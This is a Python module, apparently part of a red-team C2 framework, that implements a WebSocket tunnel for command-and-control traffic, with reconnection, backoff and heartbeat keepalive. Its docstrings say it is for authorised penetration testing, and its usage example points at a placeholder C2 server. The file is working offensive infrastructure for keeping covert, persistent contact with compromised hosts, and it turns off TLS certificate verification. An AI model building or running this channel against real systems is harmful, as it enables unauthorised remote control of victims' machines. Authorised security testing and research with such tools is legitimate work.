#!/usr/bin/env python3
"""
WebSocket 隧道 - WebSocket Tunnel

通过 WebSocket 协议传输 C2 数据
仅用于授权渗透测试和安全研究

特性:
    - 全双工通信
    - 低延迟
    - 支持 WS 和 WSS
    - 自动重连
"""

import time
import uuid
import json
import threading
import queue
import logging
from typing import Optional, Dict, Any, Callable

from ..base import BaseTunnel, C2Config
from ..encoding import C2Encoder

logger = logging.getLogger(__name__)

# WebSocket 库
try:
    import websocket
    HAS_WEBSOCKET = True
except ImportError:
    HAS_WEBSOCKET = False

try:
    import websockets
    HAS_WEBSOCKETS = True
except ImportError:
    HAS_WEBSOCKETS = False


class WebSocketTunnel(BaseTunnel):
    """
    WebSocket 隧道

    通过 WebSocket 进行全双工通信

    Usage:
        config = C2Config(
            server="c2.example.com",
            port=443,
            protocol="wss"
        )
        tunnel = WebSocketTunnel(config)

        if tunnel.connect():
            tunnel.send(b"data")
            response = tunnel.receive()
            tunnel.disconnect()
    """

    def __init__(self, config: C2Config):
        """
        初始化 WebSocket 隧道

        Args:
            config: C2 配置
        """
        super().__init__(config)

        self._ws: Optional[Any] = None
        self._session_id: Optional[str] = None

        # 编码器
        self.encoder = C2Encoder()

        # 消息队列
        self._recv_queue: queue.Queue = queue.Queue()
        self._send_queue: queue.Queue = queue.Queue()

        # 后台线程
        self._recv_thread: Optional[threading.Thread] = None
        self._running = False

        # 回调
        self._on_message: Optional[Callable[[bytes], None]] = None
        self._on_error: Optional[Callable[[Exception], None]] = None
        self._on_close: Optional[Callable[[], None]] = None

    @property
    def websocket_url(self) -> str:
        """获取 WebSocket URL"""
        protocol = 'wss' if self.config.protocol in ('wss', 'https', 'websocket') else 'ws'
        return f"{protocol}://{self.config.server}:{self.config.port}/ws"

    def connect(self) -> bool:
        """
        建立 WebSocket 连接

        Returns:
            是否成功
        """
        if not HAS_WEBSOCKET and not HAS_WEBSOCKETS:
            logger.error("WebSocket library not available. Install: pip install websocket-client")
            return False

        try:
            url = self.websocket_url
            headers = self._build_headers()

            if HAS_WEBSOCKET:
                # 使用 websocket-client
                websocket.enableTrace(False)

                self._ws = websocket.create_connection(
                    url,
                    timeout=self.config.timeout,
                    header=[f"{k}: {v}" for k, v in headers.items()],
                    sslopt={"cert_reqs": 0} if 'wss' in url else None
                )

                if self._ws.connected:
                    self._session_id = str(uuid.uuid4())[:16]
                    self._connected = True
                    self._running = True

                    # 启动接收线程
                    self._recv_thread = threading.Thread(
                        target=self._receive_loop,
                        daemon=True
                    )
                    self._recv_thread.start()

                    logger.debug(f"WebSocket tunnel connected: {url}")
                    return True

            logger.warning("WebSocket connection failed")
            return False

        except Exception as e:
            logger.error(f"WebSocket connect error: {e}")
            return False

    def disconnect(self) -> None:
        """断开 WebSocket 连接"""
        self._running = False
        self._connected = False

        if self._ws:
            try:
                self._ws.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            self._ws = None

        # 等待接收线程结束
        if self._recv_thread and self._recv_thread.is_alive():
            self._recv_thread.join(timeout=2.0)

        self._session_id = None
        logger.debug("WebSocket tunnel disconnected")

    def send(self, data: bytes) -> bool:
        """
        发送数据

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        if not self._connected or not self._ws:
            logger.warning("Cannot send: not connected")
            return False

        try:
            # 发送二进制数据
            self._ws.send_binary(data)
            return True

        except Exception as e:
            logger.error(f"WebSocket send error: {e}")
            self._handle_disconnect()
            return False

    def send_text(self, text: str) -> bool:
        """
        发送文本数据

        Args:
            text: 要发送的文本

        Returns:
            是否成功
        """
        if not self._connected or not self._ws:
            return False

        try:
            self._ws.send(text)
            return True
        except Exception as e:
            logger.error(f"WebSocket send text error: {e}")
            return False

    def send_json(self, data: Dict[str, Any]) -> bool:
        """
        发送 JSON 数据

        Args:
            data: 要发送的字典

        Returns:
            是否成功
        """
        try:
            text = json.dumps(data, separators=(',', ':'))
            return self.send_text(text)
        except Exception as e:
            logger.error(f"WebSocket send JSON error: {e}")
            return False

    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        """
        接收数据

        Args:
            timeout: 超时时间

        Returns:
            接收到的数据，无数据返回 None
        """
        if not self._connected:
            return None

        try:
            # 从队列获取数据
            data = self._recv_queue.get(timeout=timeout or self.config.timeout)
            return data

        except queue.Empty:
            return None
        except Exception as e:
            logger.debug(f"WebSocket receive error: {e}")
            return None

    def receive_nowait(self) -> Optional[bytes]:
        """非阻塞接收"""
        try:
            return self._recv_queue.get_nowait()
        except queue.Empty:
            return None

    # ==================== 回调设置 ====================

    def on_message(self, callback: Callable[[bytes], None]) -> None:
        """设置消息回调"""
        self._on_message = callback

    def on_error(self, callback: Callable[[Exception], None]) -> None:
        """设置错误回调"""
        self._on_error = callback

    def on_close(self, callback: Callable[[], None]) -> None:
        """设置关闭回调"""
        self._on_close = callback

    # ==================== 内部方法 ====================

    def _build_headers(self) -> Dict[str, str]:
        """构建请求头"""
        headers = {
            'User-Agent': self.config.user_agent,
            'Origin': f"https://{self.config.server}",
            'Sec-WebSocket-Protocol': 'binary',
        }
        headers.update(self.config.headers)
        return headers

    def _receive_loop(self) -> None:
        """接收循环（后台线程）"""
        while self._running and self._ws:
            try:
                self._ws.settimeout(1.0)
                data = self._ws.recv()

                if data is None:
                    continue

                # 转换为 bytes
                if isinstance(data, str):
                    data = data.encode('utf-8')

                # 放入队列
                self._recv_queue.put(data)

                # 触发回调
                if self._on_message:
                    try:
                        self._on_message(data)
                    except Exception as e:
                        logger.error(f"Message callback error: {e}")

            except websocket.WebSocketTimeoutException:
                continue
            except websocket.WebSocketConnectionClosedException:
                self._handle_disconnect()
                break
            except Exception as e:
                if self._running:
                    logger.debug(f"Receive loop error: {e}")
                    if self._on_error:
                        self._on_error(e)
                break

    def _handle_disconnect(self) -> None:
        """处理断开连接"""
        self._connected = False
        self._running = False

        if self._on_close:
            try:
                self._on_close()
            except Exception as e:
                logger.error(f"Close callback error: {e}")


# ==================== 高级 WebSocket 隧道 ====================

class ReconnectingWebSocketTunnel(WebSocketTunnel):
    """
    自动重连 WebSocket 隧道

    特性:
    - 自动重连
    - 指数退避
    - 心跳保活
    """

    def __init__(self, config: C2Config):
        super().__init__(config)

        self._max_retries = config.max_retries
        self._retry_count = 0
        self._retry_delay = config.retry_delay
        self._auto_reconnect = True

        # 心跳
        self._heartbeat_interval = 30.0
        self._heartbeat_thread: Optional[threading.Thread] = None
        self._last_heartbeat = 0.0

    def connect(self) -> bool:
        """带重试的连接"""
        while self._retry_count < self._max_retries:
            if super().connect():
                self._retry_count = 0
                self._start_heartbeat()
                return True

            self._retry_count += 1
            delay = self._retry_delay * (2 ** (self._retry_count - 1))
            logger.info(f"Reconnecting in {delay:.1f}s (attempt {self._retry_count}/{self._max_retries})")
            time.sleep(delay)

        return False

    def disconnect(self) -> None:
        """断开连接"""
        self._auto_reconnect = False
        self._stop_heartbeat()
        super().disconnect()

    def _handle_disconnect(self) -> None:
        """处理断开连接"""
        super()._handle_disconnect()

        if self._auto_reconnect:
            logger.info("Connection lost, attempting to reconnect...")
            threading.Thread(target=self._reconnect, daemon=True).start()

    def _reconnect(self) -> None:
        """重连"""
        time.sleep(1.0)
        self.connect()

    def _start_heartbeat(self) -> None:
        """启动心跳"""
        self._heartbeat_thread = threading.Thread(
            target=self._heartbeat_loop,
            daemon=True
        )
        self._heartbeat_thread.start()

    def _stop_heartbeat(self) -> None:
        """停止心跳"""
        if self._heartbeat_thread:
            self._heartbeat_thread = None

    def _heartbeat_loop(self) -> None:
        """心跳循环"""
        while self._running and self._heartbeat_thread:
            try:
                if time.time() - self._last_heartbeat >= self._heartbeat_interval:
                    self._send_heartbeat()
                    self._last_heartbeat = time.time()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            time.sleep(1.0)

    def _send_heartbeat(self) -> None:
        """发送心跳"""
        if self._ws and self._connected:
            try:
                self._ws.ping()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

__all__ = [
    'WebSocketTunnel',
    'ReconnectingWebSocketTunnel',
    'HAS_WEBSOCKET',
    'HAS_WEBSOCKETS',
]
